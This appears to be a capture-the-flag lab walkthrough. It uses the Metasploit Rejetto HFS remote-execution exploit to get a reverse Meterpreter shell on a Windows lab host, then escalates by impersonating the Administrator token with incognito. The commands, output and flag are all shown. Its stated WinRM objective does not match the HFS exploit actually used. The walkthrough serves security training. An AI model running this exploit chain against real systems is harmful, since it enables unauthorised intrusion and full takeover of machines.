## Privilege Escalation: Impersonate

### Target
`demo.ine.local`

### Tools:
* `msf`
* `nmap`

### Objective: 
Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!

---
```bash
┌──(root㉿INE)-[~]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.9  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:09  txqueuelen 0  (Ethernet)
        RX packets 5434  bytes 446724 (436.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4050  bytes 2742900 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.48.7  netmask 255.255.255.0  broadcast 10.10.48.255
        ether 02:42:0a:0a:30:07  txqueuelen 0  (Ethernet)
        RX packets 1620  bytes 172301 (168.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1777  bytes 162072 (158.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25814  bytes 16199390 (15.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25814  bytes 16199390 (15.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-22 07:35 IST
Nmap scan report for demo.ine.local (10.3.22.167)
Host is up (0.0031s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          HttpFileServer httpd 2.3
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds

┌──(root㉿INE)-[~]
└─# searchsploit HFS | grep Metasploit
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                   | windows/remote/34926.rb
```
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.48.7:4444 
[*] Using URL: http://10.10.48.7:8080/HUf4hw4lGohc
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HUf4hw4lGohc
[*] Sending stage (176198 bytes) to 10.3.22.167
[!] Tried to delete %TEMP%\lFfVCqH.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.48.7:4444 -> 10.3.22.167:49756) at 2026-01-22 07:38:36 +0530
[*] Server stopped.

meterpreter > 
```
```bash
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege
meterpreter > list_tokens -u
[-] The "list_tokens" command requires the "incognito" extension to be loaded (run: `load incognito`)
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
```
```bash
meterpreter > cd Users\\Administrator\\Desktop\\
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-11-07 12:52:42 +0530  desktop.ini
100666/rw-rw-rw-  32    fil   2021-04-22 12:57:34 +0530  flag.txt

meterpreter > cat flag.txt 
x28c832a39730b7d46d6c38f1ea18e12
```
flag: **x28c832a39730b7d46d6c38f1ea18e12**